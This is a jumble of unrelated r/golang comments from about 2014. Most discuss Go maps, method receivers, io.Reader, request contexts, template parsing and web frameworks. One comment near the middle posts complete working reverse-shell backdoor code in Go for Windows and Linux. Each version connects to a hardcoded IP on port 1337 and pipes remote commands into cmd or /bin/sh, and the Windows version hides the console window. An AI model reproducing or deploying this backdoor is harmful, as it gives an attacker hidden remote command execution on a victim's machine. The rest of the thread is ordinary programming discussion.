When you use `net/http`, you're not writing a web server, you're writing a *handler* for an existing web server. XMPP components are exactly that.
Those are two different uses of the word "map". The first is when you apply a function to every value in a collection, the second map is not a function but refers to the data structure which is commonly called an associative array. So Map() does not "work" with map[int]string.
It is easier to reason about a []byte if you want to read it multiple times, since a plain Reader can only be read once. Say you want to read from the Reader before passing it to another function. Now you need to use TeeReader. If you forget it, the error will not show up in the function where the TeeReader is missing, but it the function the reader is read next. That makes it harder to debug and might lead to subtle bugs when doing refactoring in a team. For sure, Reader is better for larger data but might not be worth the hassle for small data of limited and known size.
`strings.Map` is like `tr///` or `map {} split //` in Perl. `map` is like `%` in Perl. 
map and Map() ,you're confused
don't you need some kind of LoadLibrary Kernel32.lib https://code.google.com/p/go-wiki/wiki/WindowsDLLs
Nice. I guess crc32c "may" be faster (see: cityhash) if you have a CPU new enough to do it in hardware, but I haven't seen any benchmarks comparing the two. Anyway, thanks for the lib! Was just wondering about xxhash and go... I also wish they would do a comparison speedwise between "raw line speed" and xxhash... (murmurhash is also said to be quite fast).
Can you publish those benchmarks somewhere? 
Well spotted! It depends a little on the underlying map, but the value that you get (m.bm) is an interface value, so someone doing: m.bm = nil will not affect the value you got from Items(). However, the map value that you receive will point to the same underlying memory, so modifying the contents of the map will affect other instances of the map and thus won't be thread-safe, unless the modifications are done with thread-safe methods.
if I could just get gocode integration I'd be soooooo happy.
Did you bench it against a buffered reader?
Sorry, not PHP. Was a bit tired at the time. And thanks for the practical advice!
Yeah, I don't really like messing with my gopath either. In my opinion, all these revision pinning/vendoring applications should only be used on release branches, so you lock down the exact code for a release. But for development branches, just use head, like normal. If you don't trust your dependencies not to break you, don't use those dependencies.
It's meant to be run in that browser window, not in the console. I think the webpage has special handing to handle the output, since the code is really just printing out the base64 encoded bytes of the image. (This is the code that pic.show uses: https://code.google.com/p/go-tour/source/browse/pic/pic.go#15)
Gocode is dependent on me completing this PR against autocomplete-plus first: https://github.com/saschagehlich/autocomplete-plus/pull/99 Rest assured, gocode is #1 on the priority list.
You can't really provide a general-purpose thread-safe map wrapper in Go, because of this very reason. I fail to see any bigger point for having BeeMap. What would be better is to explicitely require from users to care about thread-safety and provide just an convenience adapter: https://play.golang.org/p/FzCRCouhtp It's not possible to achieve the same level of safety with BeeMap, why to bother having it in the first place? Moreover the implementation of BeeMap is wrong, it should use value receiver: // Items returns all items in safemap. func (m BeeMap) Items() map[interface{}]interface{} { m.lock.RLock() defer m.lock.RUnlock() return m.bm } I'm going to nitpick on it a bit, as I tried to understand the comment. Are "Items" a map itself? If yes, why it's not articulated this way? // Items returns the underlying map. func (m BeeMap) Items() map[interface{}]interface{} { If it were, the method has no sense at all, does it? There is no need to lock the map to just copy the reference - read lock is needed only for *accessing* the map (looking up a key etc.). Ergo the method would do just fine without a read lock: https://play.golang.org/p/ulJoGJ5JIU No races reported when ran with -race. Summing up the Items method: * is not thread safe * is wrongly implemented * takes a useless lock All that achieved in just 4 lines of code ;)
Safer? http://play.golang.org/p/8H21_sZKMD *edit - Less spammy
Do you have a benchmark handy?
Thank you so much! I didn't know that kind of thing existed. The next time I have access to a computer I'll look through the list.
Cool, I've been playing with Atom and it's really nice, but having no autocomplete is a deal breaker for me. I'll definitely try it when it's ready.
I don't see anything that proves me wrong. You have a type that wraps two pointers, thus passing a pointer of two pointers makes no sense - that's why Items() should be bound to a value, not a pointer. [edit] &gt; it's a bug. It should be deep copy the map before return. Thanks! &gt; It fixed here It's not a deep copy, it's shallow copy - you just copy the interfaces, keys and values. There's a lot more needed to make a deep copy of the map you got there.
Not easily. The [Flag struct](http://golang.org/pkg/flag/#Flag) doesn't have any helpers on it; you'd have to try to parse the [Value](http://golang.org/pkg/flag/#Value) yourself.
Thanks! It is enough for my case.
No. I could write one as a Github gist, but that would be work.
I was at a meetup on Wednesday where the guys at Sourcegraph gave a talk on how they wrote their webapp in Go. Best thing: they have published all of it on github. [github link](https://github.com/sourcegraph/thesrc)
That makes sense. And yes, when I ran it in the browser, it put an image in the results pane. Thanks!
I'm working on a pretty large web app, and it's coming along nicely. No Martini, only the standard lib, gorilla mux, and gorm (for sql). Feel free to check [gophish](http://github.com/jordan-wright/gophish) out and let me know what you think!
1. as the first rule say: &gt;&gt;&gt;First, and most important, does the method need to modify the receiver? If it does, the receiver must be a pointer. though the type wraps two pointers, use the pointer recieve will make sense that this method will modify the receiver value. So I abide this rules. 2. yep, I mistake. it should be deep copy. but my implement is a shallow copy. I still can improved. 
&gt; So I abide this rules. I don't want to be picky, I just want you to understand why those rules are what they are, not blindly misinterpret them. https://play.golang.org/p/jC29U-hU6_ All the methods are defined on the value, even though 2 of them do modify it. Do you see why it works?
I know what you mean. Map is references. but my meaning is why I am use the pointer is to show these method will modify the value of type. 
Nice presentation. Gave Atom a shot and it doesn't look half bad. Looking forward to trying it out for editing Go code. 
[I have asked a similar question before.](http://www.reddit.com/r/golang/comments/1vlj9e/complete_opensource_go_web_apps/) You may find some helpful answers there.
It will not run faster as pure-Go. In general, gcc produces code which is 2-3x faster than Go for CPU intensive workloads. However, pure-Go libraries are in general more useful tha cgo ones. Tradeoffs, tradeoffs..
From the functional point of view, Items() does not modify your map[interface{}]interface{}. It takes a lock, which requires a pointer, but this is an implementation detail which certainly does not require any special treatment from the API point of view. Nevertheless, you write whatever code you find ok and I'm cool with that. [edit] If you'd writen Items() in C++ it would be a const method called on mutable this. And rule of a thumb -&gt; const method + small struct = value receiver.
Wow! Cool. And ranger-like feature - cool^2 :)
http://ace.c9.io/
Thanks for pointing this out, I am just starting with Go - I have read effective Go of course but it was several months ago - I think it's time to read it again:)
I don't think a name conflict is likely here. Different namespace. One is a library used by a particular text editor. The other is a templating engine used in a particular programming language. https://ace.apache.org/ http://en.m.wikipedia.org/wiki/AceProject http://www.cs.wustl.edu/~schmidt/ACE-overview.html 
#####&amp;#009; ######&amp;#009; ####&amp;#009; [**AceProject**](https://en.wikipedia.org/wiki/AceProject): [](#sfw) --- &gt; &gt;__AceProject__ is a high-level [web-based](https://en.wikipedia.org/wiki/Web-based) [proprietary](https://en.wikipedia.org/wiki/Proprietary_software) [project management software](https://en.wikipedia.org/wiki/Project_management_software) developed by a Canadian company Websystems Inc. based in [Quebec City](https://en.wikipedia.org/wiki/Quebec_City), [Canada](https://en.wikipedia.org/wiki/Canada). The product is distributed both as [software as a service](https://en.wikipedia.org/wiki/Software_as_a_service) (SaaS) and as [on-premises software](https://en.wikipedia.org/wiki/On-premises_software). &gt; --- ^Interesting: [^Political ^party ^funding](https://en.wikipedia.org/wiki/Political_party_funding) ^| [^ACE ^Electoral ^Knowledge ^Network](https://en.wikipedia.org/wiki/ACE_Electoral_Knowledge_Network) ^| [^Vote ^counting ^system](https://en.wikipedia.org/wiki/Vote_counting_system) ^| [^Comparison ^of ^project ^management ^software](https://en.wikipedia.org/wiki/Comparison_of_project_management_software) ^Parent ^commenter ^can [^toggle ^NSFW](http://www.np.reddit.com/message/compose?to=autowikibot&amp;subject=AutoWikibot NSFW toggle&amp;message=%2Btoggle-nsfw+cj98a3v) ^or[](#or) [^delete](http://www.np.reddit.com/message/compose?to=autowikibot&amp;subject=AutoWikibot Deletion&amp;message=%2Bdelete+cj98a3v)^. ^Will ^also ^delete ^on ^comment ^score ^of ^-1 ^or ^less. ^| [^(FAQs)](http://www.np.reddit.com/r/autowikibot/wiki/index) ^| [^Mods](http://www.np.reddit.com/r/autowikibot/comments/1x013o/for_moderators_switches_commands_and_css/) ^| [^Magic ^Words](http://www.np.reddit.com/r/autowikibot/comments/1ux484/ask_wikibot/)
You should be using constant-time compare to check passwords, to prevent the slight chance of a timing attack: len(actual) == len(expected) &amp;&amp; subtle.ConstantTimeCompare([]byte(actual), []byte(expected)) == 1
I profiled it and it's mainly slow in `cgocall`, all the context switches are killing it.
Since this leverages html/template (good!) can we assume that it follows the same security model (i.e. everything is untrusted by default?). I've also noticed that a few examples call `ace.ParseFiles` in the handler (so, per-request). Although you may have done this to keep the example simple, it's going to set newbies off in the wrong direction—since this is a *common* newbie mistake. It may be best to just use a simple global or wrap the handler in a closure.
(Posted this initially with a misspelling in the URL. Deleted and reposted to fix it.)
Thanks! I would be glad if you could try Ace template engine!
I wrote a skeleton that may be a good place to start: https://github.com/jadekler/git-go-websiteskeleton. Note: martini and some of the other larger frameworks have tried (and continue to try) to emulate larger frameworks in other languages to mixed results. Overall, the built in tools will get you the best results until you start building something really massive - even then, they may be better, but it's your call =)
Thanks for your comment. &gt; Since this leverages html/template (good!) can we assume that it follows the same security model (i.e. everything is untrusted by default?). Yes. &gt; I've also noticed that a few examples call ace.ParseFiles in the handler (so, per-request). We have to call ace.ParseFiles in the handler because the loading target template differs every request. And calling ace.ParseFiles every request is useful in development because the changes of templates are reflected immediately. You can cache the parsed result by using cache option and this option should be used in production to omit parsing process every request. https://github.com/yosssi/ace/tree/master/examples/cache
Just to get a better understanding - talking about production only here: 1. With vanilla html/template, you typically call `template.ParseFiles` once. Typically it's beneficial to have a `map[string]*template.Template` that contains the name &lt;-&gt; parsed template mapping, and you either have that as a global or pass the map around, with your handlers calling the template they need to render by map key (i.e. [like I've talked about here](http://elithrar.github.io/article/approximating-html-template-inheritance/)) 2. Actual caching of the final, rendered template is not provided - that's handled per-request because that level of caching is typically a "per application" thing. You don't want to output a cached template that has the wrong data, or another user's data, in it. 3. Given the above, how does `ace` differ? The `cache` parameter just caches the parse (i.e. the compilation, not the rendered result). Which is what `html/template` already does. Personally, I think it should be the opposite: you should act like `html/template` by default, with parsing done *once* on start-up. Any desire for dynamic reloading during development should be explicitly requested. (I've seen way too many Gophers parsing templates per-request, which is a huge performance hit, and I think it's important to get away from that as much as possible). 
We open-sourced a demo web app that uses the same patterns from our larger main site, https://sourcegraph.com. It's called "thesrc" and you can check it out at: https://github.com/sourcegraph/thesrc https://sourcegraph.com/github.com/sourcegraph/thesrc We explained some of the design decisions in a talk last month (https://sourcegraph.com/blog/google-io-2014-building-sourcegraph-a-large-scale-code-search-engine-in-go).
Hey, I made the example you mentioned (https://github.com/sourcegraph/thesrc). There's no associated tutorial, but I'd love to make one. Were there any parts that were particularly difficult to understand or that you want an explanation of? I can answer here and I'll be sure to include it in whatever tutorial we make.
Just recently there was a question posted on go-nuts about GDB not working on Windows. They had this go file: // dd.go package main func main() { x := 1 println(x) // &lt;= breakpoint here println(x) } Inside GDB they set a breakpoint at line 6 and when they hit that break point they did this print command: (gdb) print x $1 = 4339947 which clearly shows the print output is not correct. As the author of the *Zeus IDE* I was curious to see if the debugger inside of Zeus worked in a similar fashion. From a debug session inside of Zeus I was able to replicate pretty much the same results: Breakpoint 1, main.main () at F:/dd.go:6 F:/dd.go:6:45:beg:0x401024 (gdb) print x $1 = 0 (gdb) next 1 F:/dd.go:7:57:beg:0x40103a (gdb) print x $2 = 4198458 (gdb) As was stated in that go-nuts post the reason for this incorrect GDB behaviour is found here: http://golang.org/doc/gdb *GDB does not understand Go programs well. The stack management, threading, and runtime contain aspects that differ enough from the execution model GDB expects that they can confuse the debugger, even when the program is compiled with gccgo.* 
Came in here to post your gophish. It's been a ton of help and very well constructed.
I think Value Receiver and Pointer Receiver is very confused for me in the term of learning go , because Value Reveiver include Value Copy, which is explicit for users and cause performance problems if abused . So I think using Pointer Receiver is more proper.
And another question , if it is like yours: // Items returns the underlying map. func (m BeeMap) Items() map[interface{}]interface{} { when I call it like this: BeemapInstance.Items() it's a Value Receiver, and there is a "Value Copy",is it safe when someone modify the map somewhere ? 
examples? 
Did you actually read the article? Do you know what a parser is? Open your mind a little https://en.wikipedia.org/wiki/Static_program_analysis EDIT: link to the correct article
&gt; Why in the world would you write a stand alone PHP parser? Well you could * Write a transpiler from PHP to a nicer, faster language * Write a transpiler from PHP to JS so you can migrate some of your code to the browser * Make a code search engine that is aware of PHP syntax * Detect bugs automatically through static analysis * Perform automatic code refactoring (à la go fmt) * Perform automatic version upgrades (à la go fix) * Integrate proper context-aware syntax highlighting * Analyse for duplicated code at the AST level * Detect and automatically remove slow idioms, or perform optimisation of the AST * Write a PHP interpreter that is better than the Zend one (à la HHVM) * Replace mysql_* with database agnostic calls * Make a syntax-aware diff tool for git or hg * Write a pre-processor that only operates on the html sections of PHP source files The transpiler and gofmt options are explicitly listed in the article. You should read it. [edit, fixed my "à la"s, thanks /u/seppoastian]
&gt; a non-standard homebuilt parser As if there were a standard PHP grammar.
It must be in user code (user auth provider). But I add this solution to attar's SimpleAuthProvider. Thanks!
Would be really nice if you could add some text above the images. 
BeeMap has other method: Get/Set/Delete which will modify the map. I just want to keep consistent style for method set.
I've found resources to be a very interesting feature. Sadly, it relies on reflection and some people will complain about that like they do about Martini.
Reflection is used everywhere. Go build-in libraries like encoding/json and most popular web frameworks (Martini, revel, goji etc..) make extensive use of it. I share your opinion about people might think of. The best way to vanish this myth is probably to give it a try :). 
Since I develop solutions for clients, the Microsoft licensing costs became too much. Providing a solution on Linux is cheaper and I have many more options.
Annd down.
what OS are you compiling on? Do you need to link against Kernel32 ?
The comment near the end of the talk, about coersing between strings and byte slices being "for free", surprised me. Wait, I thought, that can't possibly work in general! Looking into it more closely, I think the speaker is referring to a [particular optimization involving map lookups](https://code.google.com/p/go/issues/detail?id=3512). If this optimization is what the speaker is talking about, then that makes more sense to me than what I thought he meant originally.
OK looks like you need to put the include &lt;windows.h&gt; line before the other line and it works [farther anyway], I'll ping golang-nuts and see why it was so hard to figure that out...
[gin](https://github.com/gin-gonic/gin) wins.
You should ask Facebook.
Oh, i thought it would create a picture mosaic.
To fully parameterize a container in docker for example you have to react on e.g. environment variables. Many tools provide commandline flags or other mechanisms to change their behaviour that way. Others don't. Most tools you want to make kind of configurable on docker startup needs either a customized config which is mounted inside the container or provide sufficient command line arguments. In the first case, mounting customized configs is the only option which is quite bad in distributed systems if you only want to change e.g. the masters ip address in a config. IMO in docker environment variables are the best option to configure small parts of the container, expenv makes that a less painful experience (no bash wrappers).
There is no support for the httpd.Handler. Pastis intends to serve one single purpose : building JSON services in a simple and type safe manner. Opening the door to other features would defeat its purpose. It would be possible to add HandleFunc callback to your API exposing its method addHandler(method string, handler http.HandlerFunc, pattern string) but as I said it is not what Pastis is meant to. I prefer to keep it simple. 
Sort of, except it abstracts the actual machines themselves rather than managing the configuration of software on an individual machine. It's like a cloud provider-agnostic version of AWS CloudFormation.
The EC2 examples look exactly like what you might write using Ansible.
Appears to just be MySQL.
Right, I just want to find a clean way to express the same concept without breaking the API's interface too much. Honestly, what might happen is a new constructor to pass a dialect in as well.
I'm using YCM with your plugin, and Tagbar, and I've been really happy with my Go setup. Thanks Farslan and others who've made it possible.
I would be interested in slides before I invest 20 minutes to watch the entire talk.
Um, was it really necessary to go all Go on this? It's pretty much a one-liner in shell: cat example.txt | while read -r line; do eval "echo $line"; done
As did I.
cmd := exec.Command("cmd", "/C", status) cmd.SysProcAttr = &amp;syscall.SysProcAttr{HideWindow: true} out, _ := cmd.Output(); 
Thanks, now the reverse shell! backdoor works !!! Here the final code: GO Reverse shell for Windows. **rshellw.go** package main // Reverse shell // Test with nc -l 1337 // //import "os" import "os/exec" import "net" import "fmt" import "syscall" import "bufio" func main(){ c,_:=net.Dial("tcp","192.168.1.6:1337"); for{ status, _ := bufio.NewReader(c).ReadString('\n'); fmt.Println(status) //out, _:=exec.Command("cmd","/Y", '/Q', "/K", status).Output(); cmd := exec.Command("cmd", "/C", status) cmd.SysProcAttr = &amp;syscall.SysProcAttr{HideWindow: true} out, _ := cmd.Output(); c.Write([]byte(out)) } } **Go Reverse Shell For Linux** **rshell.go** package main // Reverse shell // Test with nc -l 1337 // import"os/exec" import"net" func main(){ c,_:=net.Dial("tcp","192.168.56.1:1337"); cmd:=exec.Command("/bin/sh"); cmd.Stdin=c; cmd.Stdout=c; cmd.Stderr=c; cmd.Run(); } 
There is a related Go issue: [7408](https://code.google.com/p/go/issues/detail?id=7408)
Right, that's actually one of the main reasons I wrote this - this isn't something that needs to be in the stdlib (or at least I don't think so).
Accepting an io.Reader is a good practice, it makes easier to compose your decoder with other decoders and properly handle stream of data.
It is considered good practice to build functionality around common interfaces, such as `io.Reader`. It provides a lot of flexibility that is not available with other approaches. For example, one can pass in an `*os.File` or a pooled `bytes.Buffer` and the underlying code need not change. To simplify the implementation, separate the WAVFormat struct from the decoding and separate the fixed-size header portion from the variable length data. That will let you use a single call to `binary.Read` to read in the header, then you can just read `Subchunk2Size` bytes from the io.Reader directly. Here is the full modified definition: // WAVHeader fixed-size datastructure type WAVHeader struct { ChunkID uint32 ChunkSize uint32 Format uint32 Subchunk1ID uint32 Subchunk1Size uint32 AudioFormat uint16 NumChannels uint16 SampleRate uint32 ByteRate uint32 BlockAlign uint16 BitsPerSample uint16 Subchunk2ID uint32 Subchunk2Size uint32 } type WAVFormat struct { Header WAVHeader Data []byte } And with that, the `Decode` function becomes much simpler: // Decode reads a WAVFormat from rd. func Decode(rd io.Reader, dst *WAVFormat) error { if err := binary.Read(rd, binary.BigEndian, dst.Header); err != nil { return err } // Reuse the Data slice, if possible if cap(dst.Data) &gt;= dst.Subchunk2Size { dst.Data = dst.Data[:dst.Subchunk2Size] } else { dst.Data = make([]byte, dst.Subchunk2Size) } if _, err := io.ReadFull(r, dst.Data); err != nil { return err } return nil } Note there may be alignment issues if the `split` did not land on WAV frame boundaries. I am not familiar with the WAV format, but this may require some extra work to find the start of header sections. 
You might find this article an interesting read: https://www.datadoghq.com/2014/07/crossing-streams-love-letter-gos-io-reader/ I recently completed a MQTT encoder/decoder (http://github.com/surge/mqtt) and it takes a io.Reader as input. It's a very flexible interface and many packages out there implements it. For example you can use bufio.NewReader(). You can also implement your own if none fits your needs. So to answer your question, I think you should take io.Reader as parameter, and use something like bufio (or something like that) to accumulate bytes if needed.
You don't *need* to tie yourself to Github/Bitbucket if you don't want to. I publish all of my packages under gopkg.thequux.com using [a small tool I wrote](https://github.com/thequux/gopkg-directory) so that the package hierarchy doesn't need to be the same as my repo structure.
Thank you. Just what I need! 
This is something l miss from the standard library. I think an interface or a package like this in net/http for contexts will make it a very complete solution (though it is pretty complete already)
I like that reference to **key** variable to avoid collision. I didnt know something like that even existed. Nice micro pattern.
Yep. Liked that a lot as well. Thought about it after reading the other blog post about context the other day but this approach didn't occur to me.
Here is a non-mobile link: http://infoworld.com/t/application-development/why-one-developer-switched-java-google-go-247068 [Sourcecode](https://github.com/Kharms/untouchedURL) | [How am I doing?](http://www.reddit.com/message/compose/?to=untouchedURL&amp;amp;subject=untouchedURL%20feedback)
This isn't Go specific but I am curious. We all know making the user wait is bad. But is it worse that we don't return what they want? What does Google do in an instance where they timeout. What is shown back to the user? 
Yep.. But they give an example using int as a type and 0 for the first key.. That would collide if another library would do the same, right? I think iota would be better here (it keeps counting up for each use iirc) but using the memory location of a global var no two keys can collide, so it's a far superior approach, i think.
It won't collide - they're different types and can't be assigned to each other without an explicit cast. The only time it works implicitly is with literal numeric constants, like passing something a 1 that wants your special int type.
Internal server error of some sort, I'd imagine.
Would the following snippet be useful as well? func NewPerson() Person { return Person{Foo:"Person"} } I mean, should this construct(or) be avoided?
The one thing to watch out for with this approach is making your key a pointer to a zero-sized type. The original blog post had this bug: https://code.google.com/p/go/issues/detail?id=8443
This looks exactly like something I need for my game server. Awesome. 
Okay, that makes sense. But why the dereference then?
Posting this sort of article in /r/golang is like preaching to the choir.
You should use a pointer, so return *Person.
The last time I did this, multiple Go developers answered me that this is something I'm not supported to do. There is no stability promise for the runtime of Go. Code like the one in the article will break.
This is not only for end user applications, I think, but also for systems. And I think it is used by google because they have a lot of server, and probably doing multiple requests, getting the same result. So the first comes in, the other timeout, maybe something like that. The article does not say exactly what scenario is given, to use context. 
How would this work in a simple middleware pattern like e.g. https://github.com/codegangsta/negroni? Then each middleware must have access to the context, right?
The code is fantastic to read. Good day to you sir.
My first project in Go. I wanted a simple http web server that I could start in any directory similar to this one in nodejs - [http-server](https://github.com/nodeapps/http-server). It's quite straightforward with Go since the `net/http` package is awesome, but let me know if I have done something wrong.
I'd really like to hear of your progress and just in case you're targeting to build an tiling compositor, i might be really tempted to chime in, too :) Regarding the file descriptor transfer I found [this](https://github.com/ftrvxmtrx/fd) package that does the _send fd over unix socket_ dance. It's quite short and concise. I hacked together a short example on [this](https://gist.github.com/cryptix/4d05f0a22376ab1d4c2e) gist. It's only between go programs tough but I will hack a C client example later to see if it works. I have use for it in another project where I abuse stuffing data through stdio with ugly boundaries and way to large []argv's. Beeing able to pass some fd's to my subprocesses will be quite nice.
It is in go.net, thus in the "extended" standard library.
Source?
Nice work, looks good!
Welcome to the Go community! It almost seems like a static web server is the Hello World of Go :) Mine is called serve… https://github.com/peterhellberg/serve
I understand that. But standard HandlerFuncs and Handlers have to be wrapped.
:) Yeah. Its the most easiest thing to do.
The end goal is an entirely new Desktop Environment with tiling and stacking capabilities completely written in Go. The GTK and QT Go ports are all in an alpha-like stage, so I'm not really sure what I'm going to do there. One step at a time though. That's pretty neat. I'd imagine it'd be quite useful for a lot of systems type software.
Thanks for the info.
In reality this happens very infrequently because Google is able to mitigate this in two ways. The first is fan-out. Each query you do against Google talks to dozens or hundreds of backend services. The search index is too big to fit in the RAM of one machine, so it is sharded across many servers. Additionally, you are hitting other services like the advertising backend and spell checker. Those are likely running on multiple machines as well. At least some of these servers will reply, so in the worst case you will get an incomplete answer, but still better than a 500 internal server error or a 503 service unavailable error. The second mitigation, and the reason why you rarely even get incomplete answers, is redundancy. Multiple requests are made to servers of the same service. So while the spell checking service might very well fit entirely on one machine, you are likely querying at least 2 instances, in case one of them fails. This also improves user-perceived latency, because your query waits only for the first server to return an answer. If one returns in 10ms, one returns in 100ms, and one returns an error in 5ms you're only waiting 10ms on that backend, and you still get a complete answer. This is the reason why the context object has deadlines and cancelations. As soon as that 10ms reply comes back in, it can cancel the slower subquery that would have taken 100ms.
Seems copied an wrong link, the link should be https://github.com/jinzhu/gorm#associations
If you learned Go, you will no longer want to work with - scripting languages - Java - C++ - probably C They all say, it is easy, but it has some learning curve. You might be able to get a very complete understanding of the language. The spec is not that large. So Go for it - what are you waiting? The [tour](http://tour.golang.org) is your friend.
Gorm is already a fairly well known grails orm, you might want to consider changing the name
Hey, nice and small project. I linked (well... the fork, will change it to your repo once you merged the pull request ;) ) it on gomicroprojects.com as well. Created a pull request with some changes. Cheers and keep up the good work.
I don't think it's a terrible idea, but it might be more fun to learn for a beginner to use a language with a REPL like python so they can be instantly gratified by a response. It's also much easier to learn the ins and outs of a language by using a REPL IMO. That said, I think go would be good for new people because of its small syntax. There isn't as much to keep in your brain at once.
I'm pretty sure the handler function must receive all arguments passed to it, or you'll get a compile error. That's why you'll always see w and r arguments but not always see both used. Edit: More info, as I'm not sure exactly what the scope if the question is. w and r are the (somewhat) arbitrary variable names chosen for the two arguments. What follows them in the function declaration is the type of variable they are. You might also see functions like this: func addOne(mynum int) int {return mynum+1} mynum is the variable name and int is the type. The extra int after the arguments list is the type of the return value, since the function is returning an integer.
Go functions can be variables. You are *passing* the function `handler` as a parameter to `http.HandleFunc`. `http.HandleFunc` will then do a bunch of stuff and call `handler` when it needs to. Deep inside `http.HandleFunc` you'll see it calling your passed-in `handler` function and giving it the `w` and `r` variables that `handler` needs. After calling your `handler` function `http.HandleFunc` will then take care of the nitty-gritty details of serving the final results to the end client. Here's an example that should make this more clear: http://play.golang.org/p/S4r_ivdP2R package main import ( "fmt" ) // A Handler is any function that takes no parameters and returns a string type Handler func() string // This PrintResults function will take a Handler function and print the results func PrintResults(f Handler) { results := f() fmt.Println(results) } // This function satisfies the definition of type Handler. func myHandyFunc() string { return "Hello World!" } func main() { PrintResults(myHandyFunc) // We can also use an anoymous function PrintResults(func() string { return "Whoah!" }) } `
How recently did you pick up programming? And what have you built already? And how much effort are you willing to put in? And at which level you want to be programming in the future (hobbyist, professional...)?
[Here's](https://docs.google.com/document/d/1P3BLR31VA8cvLJLfMibSuTdwTuF7WWLux71CYD0eeD8/preview?sle=true&amp;pli=1) the original planning doc by Russ Cox. They've made a lot of headway since then, and I think they're aiming for Go 1.4.
Those were my first thoughts. What will happen when the Go compiler is self hosted?
[Writing Web Applications](http://golang.org/doc/articles/wiki/) has some examples which might help. 
For the record, you can rather simply cross-compile for windows with CGO since Go 1.3. http://stackoverflow.com/questions/24998260/compiling-golang-applications-under-wine/25001058#25001058 As long as you have a cross-compiler gcc (or clang) installed, you can build your Go + CGO code just fine.
I'd like to second this. gopkg.in would help. Adding semantic version tags to your repo would help too.
I noticed many of the changes are formatting. The fork uses tabs and the original uses 4 spaces. Are tabs considered the go way for indentation ?
http.HandleFunc accepts a `http.HandlerFunc` (a type). This type satisfies the `http.Handler` interface, which means that it has a `ServeHTTP(http.ResponseWriter, *http.Request)` method. As such, you can pass it as `http.HandleFunc("/", MyHandler)` and HandleFunc will (effectively) call `MyHandler.ServeHTTP(w, r)` directly. Read http://golang.org/doc/effective_go.html#interfaces &amp; http://golang.org/pkg/net/http/#HandlerFunc
Checkout [go-ipfs](https://github.com/jbenet/go-ipfs), this seems like a perfect match for it. Or at least a big chunk of it could be used.
I know that a typical function in GO looks like this: func addOne(mynum int) int { return mynum+1 } For handlers, what I don't get is why func handler look like this func handler(w http.ResponseWriter, r *http.Request) { //some code eg. ExecuteTemplate } What I don't understand is why w, and r don't have to be passed into the code in the func handler inside { } but in the first example mynum is passed Also in the first example the type data to be returned is specified as int, but in the 2nd example, there is no need to specify the return type. I suppose it's not necessary here because this has to do with serving http responses. I just don't understand what is happening in (w http.ResponseWriter, r *http.Request)
Lets see if I can help on a couple of questions. First the short answer is functions in go are [First Class Fuctions](http://en.wikipedia.org/wiki/First-class_function). As for a more detailed answer: while functions do have the form you stated, the handler function is used as an argument to the http.handlerfunc function. When used as an argument like this, the definition of the function will ask how and what kind of variables the function must take. For an example using the addOne function would be: func needlessWrapper(x int, y func(int) int) int { return y(x) } ... needlessWrapper(2, addOne) would return 3. the (w http.ResponseWriter, r *http.Request) is the form that argument to http.handlefunc takes, so they must be provided. Also as the function does not/can not take a return variable (if so the compile will fail as it will look for a different version of http.handlerfunc.) Hope that helps even a little. 
#####&amp;#009; ######&amp;#009; ####&amp;#009; [**First-class function**](https://en.wikipedia.org/wiki/First-class%20function): [](#sfw) --- &gt;In [computer science](https://en.wikipedia.org/wiki/Computer_science), a [programming language](https://en.wikipedia.org/wiki/Programming_language) is said to have __first-class functions__ if it treats [functions](https://en.wikipedia.org/wiki/Function_(programming\)) as [first-class citizens](https://en.wikipedia.org/wiki/First-class_citizen). Specifically, this means the language supports passing functions as arguments to other functions, returning them as the values from other functions, and assigning them to variables or storing them in data structures. Some programming language theorists require support for [anonymous functions](https://en.wikipedia.org/wiki/Anonymous_function) as well. In languages with first-class functions, the [names](https://en.wikipedia.org/wiki/Name_(computer_science\)) of functions do not have any special status; they are treated like ordinary [variables](https://en.wikipedia.org/wiki/Variable_(computer_science\)) with a [function type](https://en.wikipedia.org/wiki/Function_type). The term was coined by [Christopher Strachey](https://en.wikipedia.org/wiki/Christopher_Strachey) in the context of “functions as first-class citizens” in the mid-1960s. &gt; --- ^Interesting: [^Funarg ^problem](https://en.wikipedia.org/wiki/Funarg_problem) ^| [^Anonymous ^function](https://en.wikipedia.org/wiki/Anonymous_function) ^| [^Functional ^programming](https://en.wikipedia.org/wiki/Functional_programming) ^| [^Scheme ^\(programming ^language)](https://en.wikipedia.org/wiki/Scheme_\(programming_language\)) ^Parent ^commenter ^can [^toggle ^NSFW](http://www.np.reddit.com/message/compose?to=autowikibot&amp;subject=AutoWikibot NSFW toggle&amp;message=%2Btoggle-nsfw+cjcnqs1) ^or[](#or) [^delete](http://www.np.reddit.com/message/compose?to=autowikibot&amp;subject=AutoWikibot Deletion&amp;message=%2Bdelete+cjcnqs1)^. ^Will ^also ^delete ^on ^comment ^score ^of ^-1 ^or ^less. ^| [^(FAQs)](http://www.np.reddit.com/r/autowikibot/wiki/index) ^| [^Mods](http://www.np.reddit.com/r/autowikibot/comments/1x013o/for_moderators_switches_commands_and_css/) ^| [^Magic ^Words](http://www.np.reddit.com/r/autowikibot/comments/1ux484/ask_wikibot/)
Thanks! This is quite clear. Just some loose ends to tie up - What goes into w, r?
Thanks! This is quite clear. Just some loose ends to tie up - What goes into w, r?
w is a responsewriter object, this allows you to put output to the connected client like fmt.Fprintln(w, "This is a test") and some other functions like the template execute use this too. The r is the response given to the server like in a post request, this will have the information that the client gives to the server. So w is so the server can talk to the client, and r is the request the client made to the server. Both of these are provided to the handler function by the http.handlerfunc.
I agree on all these points, especially the last one, and I want to add that while there's fewer libraries for go, the standard library is much more useful compared to other languages and that many times there will be less of a need for a 3rd party library.
Go is easy enough for a beginner to pick up, though outside of the Go Tour, there aren't many tutorials that introduce basic programming concepts AND Go. Learning Go is easier for someone who has experience in other languages and can pick up another language easily, or for self-directed learners. That being said, there's nothing in Go that's harder than in other languages, and some stuff is much easier. While on your quest to discover the whole HTTP pipeline, here's an interesting detour: One of the more enlightening exercises I did in terms of learning how a whole web app "fits together" is to connect to a web server on port 80 over telnet and issue HTTP commands directly. Seeing exactly what a request and a response looks like and seeing the connection close after each request is done was a bit of a "seeing the man behind the curtain" moment.
cool! I'll do that
I picked it up in June and built a simple quiz app with JS earlier this month. As much effort as it takes of course, to be a professional programmer. 
Do you have an example? I was struggling to pass the context with negroni since I defined my own handler that also took a context as arg. But then on had to typecast a lot to satisfy the negroni handler...
I love this. I hope it ends up in libcontainer. I find it fascinating that people get productive in Go so quickly.
